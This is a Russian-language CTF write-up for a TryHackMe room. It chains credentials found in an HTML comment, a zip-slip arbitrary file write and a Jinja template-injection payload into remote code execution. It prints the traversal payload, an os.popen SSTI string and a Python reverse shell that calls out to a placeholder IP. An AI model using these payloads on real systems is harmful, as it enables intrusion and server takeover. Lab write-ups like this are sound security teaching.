# The Hollow Shell: zip-slip + отравленный Jinja-шаблон

**Машина:** [The Hollow Shell](https://tryhackme.com/room/hh-thehollowshell-ddb582ac) (medium, Hacker Holidays 2026, Day 10)
**Цепочка:** креды из HTML-комментария → загрузка «shell»-пакетов (.zip) → zip-slip → перезапись кеша шаблонов → RCE.

## Вход

На 5000-м порту — портал с загрузкой «shell»-пакетов (zip с манифестом и ассетами для планшетов отеля). Креды для логина лежат в многострочном HTML-комментарии на `/login` — читаем исходник, а не брутим.

## Zip Slip

Распаковщик доверяет именам файлов в архиве. Классика:

```python
z.writestr("../../shells/<id>/p2.json", '{"slipped":true}')
```

Загружаем, проверяем `http://target:5000/shells/<id>/p2.json` — 200, запись за пределами директории подтверждена. Arbitrary write есть, осталось превратить в исполнение.

## Отравленный шаблон

Приложение на Flask/Jinja, шаблоны кешируются. Вместо того чтобы искать hooks (они оказались красной селёдкой — поле `"hooks": []` в манифесте выглядело соблазнительно, но никуда не вело), пишем через slip файл с Jinja-payload прямо в кеш шаблонов:

```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cmd').read() }}
```

Приложение рендерит кешированный шаблон — payload исполняется. Надёжнее всего сразу реверс-шелл:

```python
callback = '''
import socket,subprocess,os,pty
s=socket.socket(); s.connect(("IP",4444))
os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2)
pty.spawn("/bin/bash")
'''
```

## Заметка

Три ошибки разработчика в ряд: имя файла из архива принимается на веру, валидация allowlist'ом смотрела не туда, а шаблонизатор оценивает входные данные. Отдельно — про красные селёдки: в манифесте было поле `hooks`, которое выглядело как задуманный вектор. Потратил на него время, пока не понял, что настоящая дверь — кеш шаблонов. Урок: если «задуманный» вектор не работает, это может быть не вектор, а приманка.
